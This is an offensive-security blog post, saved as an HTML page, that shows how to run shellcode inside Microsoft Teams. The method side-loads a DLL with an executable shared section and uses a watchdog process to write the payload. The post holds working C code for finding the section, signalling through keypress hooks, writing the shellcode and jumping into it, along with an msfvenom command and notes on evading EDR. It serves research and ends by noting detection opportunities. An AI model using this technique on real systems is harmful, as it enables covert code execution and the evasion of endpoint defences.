@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Riley Kidd - Shared section code execution</title>
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/assets/css/all.css">
+  <link rel="alternate" type="application/atom+xml" title="Riley Kidd" href="https://rileykidd.com/atom.xml" />
+</head>
+<body>
+  <div class="container">
+    <div class="content">
+      <nav>
+  <h2 id="banner"><a href="/">Riley Kidd</a></h2>
+  <div id="social">
+    <div id="stalker">
+  
+  <a title="Twitter" href="https://twitter.com/247CTF">
+    <i class="fa fa-twitter-square"></i>
+  </a>
+  
+  
+  <a title="LinkedIn" href="https://www.linkedin.com/in/rileykidd">
+    <i class="fa fa-linkedin-square"></i>
+  </a>
+  
+  
+  <a title="Send an email" href="mailto:rileykidd@protonmail.com">
+    <i class="fa fa-envelope-square"></i>
+  </a>
+  
+  
+  <a title="Atom feed" id="atom" href="/atom.xml">
+    <i class="fa fa-rss-square"></i>
+  </a>
+  
+</div>
+
+  </div>
+</nav>
+
+      <h1 class="title">Shared section code execution</h1>
+<p class="meta">
+  June 21, 2022
+</p>
+<div id="post">
+  <h2 id="credits">Credits</h2>
+<p>This post will demonstrate how to utilise shared sections within a DLL to execute memory in a remote process.</p>
+
+<p>The information presented in this post references and builds upon the existing work of <a href="https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/">Bill Demirkapi</a> and <a href="https://code.google.com/archive/p/dll-shared-sections/">Gynvael Coldwind</a>. For additional context and background, you should review their existing works.</p>
+
+<h2 id="background">Background</h2>
+<p>A ‘typical’ setup to execute code in a remote process involves making use of win32 API calls (such as <code class="highlighter-rouge">OpenProcess</code>, <code class="highlighter-rouge">VirtualAllocEx</code>, <code class="highlighter-rouge">WriteProcessMemory</code>, and <code class="highlighter-rouge">CreateRemoteThread</code>) to obtain a handle to a remote process, allocate memory within the process, write shellcode to the process, and finally execute the shellcode in a remote thread.</p>
+
+<p>There are a number of different approaches and win32 API call combinations which can be utilised to perform code execution in a remote process, however Endpoint Detection and Response (EDR) tooling can be a bit of a kill joy with <a href="https://github.com/Mr-Un1k0d3r/EDRs">user mode hooks</a>.</p>
+
+<p>Rather than relying on known win32 API call chains to achieve remote code execution, we can instead make use of shared sections to achieve the same result.</p>
+
+<h2 id="shared-sections">Shared sections</h2>
+<p>Windows <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Portable Executable</a> (PE) files contain different “sections” which are areas within the file containing different information required for successful execution. For example, the <em>.text</em> section will typically contain executable code, while the <em>.rsrc</em> section will typically contain resources.</p>
+
+<p>Each section has “characteristics” which indicate how the section can be used. For example <em>IMAGE_SCN_MEM_EXECUTE</em> allows the section to be executed as code, <em>IMAGE_SCN_MEM_READ</em> allows the section to be read, and <em>IMAGE_SCN_MEM_WRITE</em> allows the section to be written to.</p>
+
+<p>A less common, but still valid section characteristic is <em>IMAGE_SCN_MEM_SHARED</em> which allows the section to be shared in memory.</p>
+
+<p>For an offensive security blog post - what does this mean in practise?</p>
+
+<p>It means we can have two separate processes, who both share the exact same data in memory (without needing to involve any API calls such as <code class="highlighter-rouge">NtMapViewOfSection</code>). This shared memory therefore enables us to modify memory in another process, which can affect its execution.</p>
+
+<h2 id="definitions-and-techniques">Definitions and techniques</h2>
+<p>To keep this post as focused on the shared memory concept as possible, we will need to skip over a few definitions and techniques you should be familiar with:</p>
+<ul>
+  <li><a href="https://cihansol.com/blog/index.php/2021/09/14/windows-dll-proxying-hijacking/">DLL Proxying/Hijacking</a></li>
+  <li><a href="https://sekuro.io/blog/eavesdropping-is-listening-enough/">DLL Side Loading</a></li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate">Keypress Hooking</a></li>
+</ul>
+
+<h2 id="plan-of-attack">Plan of attack</h2>
+<p>We can plan to abuse shared sections by performing a few steps:</p>
+<ol>
+  <li>Create a DLL which has a shared section</li>
+  <li>Side load the DLL into a process such as Microsoft Teams and create a new thread</li>
+  <li>Hook a common key used in Teams, such as the spacebar</li>
+  <li>Once a user presses spacebar within Teams, set a flag in shared memory</li>
+  <li>A watchdog process (which has also loaded the DLL and now shares memory with Teams) can identify the changed flag in shared memory</li>
+  <li>The watchdog process can write shellcode into the shared memory</li>
+  <li>The Teams thread can identify that shellcode has been written to shared memory, and can now execute it</li>
+</ol>
+
+<p>There are a few advantages to this plan of attack, when compared with a “traditional” approach:</p>
+<ul>
+  <li>Execute shellcode in a remote process without using suspicious win32 API call chains</li>
+  <li>The side loaded DLL itself is (relatively) benign and doesn’t directly contain any useful information for an analyst or responder (changes to shared memory are not saved to disk)</li>
+  <li>No interaction or handles to the “injectee” process are required (other than sideloading)</li>
+</ul>
+
+<p>As well as some disadvantages:</p>
+<ul>
+  <li>Need to write the DLL file to disk in order to side load</li>
+  <li>Need to perform DLL sideloading (using the DLL in the step above)</li>
+  <li>Need to have a secondary watchdog process to monitor, write, and contain the actual payload shellcode</li>
+  <li><em>IMAGE_SCN_MEM_SHARED</em> is an uncommon section flag</li>
+</ul>
+
+<p>Ignoring the advantages and disadvantages - let’s just break this down into parts and execute upon our plan of attack.</p>
+
+<h2 id="creating-a-shared-section">Creating a shared section</h2>
+<p>Rather than searching for a shared section in an existing binary or DLL, we can instead just create out own. Within Visual Studio we can create a new DLL, then modify a section (such as <em>.data</em>) during compilation by providing <code class="highlighter-rouge">/SECTION:.data,ERSW</code>  as an additional option during the compilation process:
+<a href="/assets/images/Pasted image 20220526113939.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220526113939.png" alt="" /></a></p>
+
+<p>Adding these additional compilation options enables the DLL <em>.data</em> section to be readable, writeable, executable, and shared. We can confirm the section characteristics using <code class="highlighter-rouge">dumpbin.exe /SECTION:.data test.dll</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SECTION HEADER #4
+   .data name
+      34 virtual size
+    6000 virtual address (0000000180006000 to 0000000180006033)
+     200 size of raw data
+    3600 file pointer to raw data (00003600 to 000037FF)
+       0 file pointer to relocation table
+       0 file pointer to line numbers
+       0 number of relocations
+       0 number of line numbers
+F0000040 flags
+         Initialized Data
+         Shared
+         Execute Read Write
+</code></pre></div></div>
+
+<p>In the dumpbin output, we can see the DLL <em>.data</em> section is set with the expected characteristic flags of <code class="highlighter-rouge">F0000040</code> which can be calculated by exclusive or’ing the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics">separate section values</a> together (including <em>IMAGE_SCN_CNT_INITIALIZED_DATA</em> due to the default purpose of the <em>.data</em> section).</p>
+
+<h2 id="finding-the-shared-section">Finding the shared section</h2>
+<p>Now we have created a DLL with a shared section, we need to be able to resolve and find the location of that shared section in memory. That way, we know where the shared data section resides and can use it to read and write across the separate processes.</p>
+
+<p>In order to do that on an x64 system, we need to be able to search for the section:</p>
+<ul>
+  <li>Obtain a handle to the loaded image base address</li>
+  <li>Locate the <code class="highlighter-rouge">ImageNtHeader</code> structure</li>
+  <li>Calculate a pointer to the first/current section</li>
+  <li>Compare the current section name (or anything) with the section we are searching for</li>
+  <li>Increment the current section pointer to continue our search to the next section</li>
+</ul>
+
+<p>We can export the function too, since this is a DLL, and we will want to use similar functionality from the watchdog process:</p>
+<pre><code class="language-C">extern "C"
+__declspec(dllexport) LPVOID section_find(const char *section) {
+    HINSTANCE hGetProcIDDLL = (HMODULE)&amp;__ImageBase;
+    PIMAGE_NT_HEADERS64 NtHeader = ImageNtHeader(hGetProcIDDLL);
+    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(NtHeader);
+
+    for (int i = 0; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++) {
+        if (strcmp((const char*)section_header-&gt;Name, section) == 0) {
+            return ((BYTE*)hGetProcIDDLL + section_header-&gt;VirtualAddress);
+        }
+        section_header++;
+    }
+    return NULL;
+}
+</code></pre>
+
+<p>Now that we can resolve the location of the shared section in memory, we can start to use it.</p>
+
+<h2 id="signalling-via-the-shared-section">Signalling via the shared section</h2>
+<p>We can choose 2 locations in the shared section to use for signalling between the watchdog and side loaded processes. Locations will need to be chosen based on the section purpose and space required. A good place to look for ‘dead’ space is at the end of a section (since they will need to be page aligned).</p>
+
+<p>Once chosen, we can export the locations from within the DLL too, since the offsets need to be shared between the processes:</p>
+<pre><code class="language-C">extern "C"
+__declspec(dllexport) int check_offset() {
+    return 255;
+}
+
+extern "C"
+__declspec(dllexport) int write_offset() {
+    return 256;
+}
+</code></pre>
+
+<p>Once defined, we can start to use these functions to resolve the shared section and calculate the offset locations:</p>
+<pre><code class="language-C">LPVOID data_section = section_find(".data");
+LPVOID data_check = (BYTE*)data_section + check_offset();
+LPVOID data_write = (BYTE*)data_section + write_offset();
+</code></pre>
+
+<p>For our use case, the <code class="highlighter-rouge">data_check</code> location will be used to signal that the spacebar has been pressed in Teams, while the <code class="highlighter-rouge">data_write</code> location will be where the watchdog process will write the actual shellcode.</p>
+
+<p>With the locations resolved, we can now setup some functionality within a loop in our DLL thread to signal the watchdog (via the shared section). When the spacebar is pressed, <code class="highlighter-rouge">0x41</code> will be written to the shared memory <code class="highlighter-rouge">data_check</code> location (which currently contains <code class="highlighter-rouge">0x00</code>):</p>
+<pre><code class="language-C">if (GetAsyncKeyState(VK_SPACE) &amp; 0x80000) {
+    *((BYTE*)data_check) = (byte)0x41;
+    set_byte = true;
+}
+</code></pre>
+
+<h2 id="monitoring-the-shared-section">Monitoring the shared section</h2>
+<p>With the functionality setup to find and write to shared memory from the DLL, we next need to create the separate watchdog process to monitor and write the actual shellcode.</p>
+
+<p>We can make use of existing functionality in the DLL (which we need to load anyway) by defining the functions, loading the DLL, and resolving the addresses of the functions already written:</p>
+<pre><code class="language-C">typedef LPVOID(__cdecl* dll_section_find)(const char*);
+typedef int(__cdecl* dll_write_offset)();
+typedef int(__cdecl* dll_check_offset)();
+
+dll_section_find section_find;
+dll_write_offset write_offset;
+dll_check_offset check_offset;
+
+HINSTANCE hGetProcIDDLL = LoadLibrary(L"test.dll");
+section_find = (dll_section_find)GetProcAddress(hGetProcIDDLL, "section_find");
+write_offset = (dll_write_offset)GetProcAddress(hGetProcIDDLL, "write_offset");
+check_offset = (dll_check_offset)GetProcAddress(hGetProcIDDLL, "check_offset");
+
+LPVOID data_section = section_find(".data");
+LPVOID data_write = (BYTE*)data_section + write_offset();
+LPVOID data_check = (BYTE*)data_section + check_offset();
+</code></pre>
+
+<p>Once we have resolved the functions and shared memory locations, the watchdog process can enter a loop and write our shellcode to the shared memory location once the monitored <code class="highlighter-rouge">data_check</code> byte has changed from the original value of <code class="highlighter-rouge">0x00</code> :</p>
+<pre><code class="language-C">while (true){
+  if (*((BYTE*)data_check) != (BYTE)0x00) {
+    memcpy(data_write, buf, size);
+    return 1;
+  }
+  Sleep(1000);
+}
+</code></pre>
+
+<h2 id="shellcode-execution">Shellcode execution</h2>
+<p>Once the shellcode has been written to the shared memory location, the last step is to execute it inline from within the side loaded Teams process, without making use of any additional win32 helper API calls.</p>
+
+<p>In order to achieve this, we can monitor the <code class="highlighter-rouge">data_write</code> location and if we have signalled the write by updating the <code class="highlighter-rouge">data_check</code> location (by pressing the spacebar earlier from within Teams) and the data has changed from the original value (again of <code class="highlighter-rouge">0x00</code>), we can jump to the <code class="highlighter-rouge">data_write</code> location and directly execute the shellcode located there:</p>
+<pre><code class="language-C">if (*((BYTE *)data_write) != (byte)0x00 &amp;&amp; set_byte) {
+     ((void (*)(void))data_write)();
+}
+</code></pre>
+
+<p>Due to our chosen method of execution via a thread, we should also take care to exit cleanly and avoid killing the parent process. For example, if using <em>msfvenom</em> to create the final shellcode, we can select to exit the thread, not the process: <code class="highlighter-rouge">msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c</code>.</p>
+
+<h2 id="taking-it-for-a-spin">Taking it for a spin</h2>
+<p>With the preparation work out of the way, we can compile the watchdog process and the shared memory section DLL. In order to keep Teams working as expected after side loading, we will also need to setup function redirects. A candidate DLL <code class="highlighter-rouge">srvcli.dll</code> was identified (using <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a>) and used for testing this proof of concept (with our version of the <code class="highlighter-rouge">srvcli.dll</code> file added to the <code class="highlighter-rouge">C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Teams\current\</code> directory).</p>
+
+<p>After compiling and executing the watchdog process, we can see the resolution of the section, memory addresses, and functions we are interested in:
+<a href="/assets/images/Pasted image 20220607154751.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607154751.png" alt="" /></a></p>
+
+<p>With the watchdog process running, we can restart teams (with the DLL side loaded) and we can similarly see the exact same shared memory address locations in the debug output:
+<a href="/assets/images/Pasted image 20220607154915.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607154915.png" alt="" /></a></p>
+
+<p>Pressing the spacebar from within Teams, we can see that <code class="highlighter-rouge">0x41</code> has been written to the <code class="highlighter-rouge">check_offset</code> location in shared memory:
+<a href="/assets/images/Pasted image 20220607154949.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607154949.png" alt="" /></a></p>
+
+<p>Updating the <code class="highlighter-rouge">check_offset</code> shared memory byte from within Teams, causes the watchdog process to write shellcode to the <code class="highlighter-rouge">data_write</code> location. Once the shellcode has been written, the thread within Teams will finally execute the shellcode:
+<a href="/assets/images/Pasted image 20220607155016.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220607155016.png" alt="" /></a></p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>By directly leveraging shared sections, an attacker is able to modify the memory of another process (by modifying the memory of its own process) without needing to interface with any potentially monitored or “suspicious” win32 API calls.</p>
+
+<p>While this approach has some advantages, there are also some unique Tactics, Techniques, and Procedures (TTPs) which would enable relatively low false-positive detections.</p>
+
+</div>
+<div id="related">
+  <h3>Recent Posts</h3>
+  <ul id="blog-posts" class="posts">
+    
+    <li>
+      <span>10 Jun 2022</span> <a href="/2022/06/10/obfuscating-shellcode-entropy/">Obfuscating shellcode entropy</a>
+    </li>
+    
+    <li>
+      <span>08 Jul 2018</span> <a href="/2018/07/08/solving-CTF-challenges-with-DLL-injection/">Solving CTF challenges with DLL injection</a>
+    </li>
+    
+    <li>
+      <span>17 Oct 2017</span> <a href="/2017/10/17/a-watering-hole-with-Windows-binaries/">A watering hole with Windows binaries</a>
+    </li>
+    
+  </ul>
+</div>
+
+      <div class="footer">
+        <div class="disclaimer">
+  
+  <p>
+    The postings on this site are my own and don't represent my employer
+  </p>
+  
+</div>
+
+      </div>
+    </div>
+  </div>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox-plus-jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<!--
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-41399516-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+-->
+</body>
+</html>
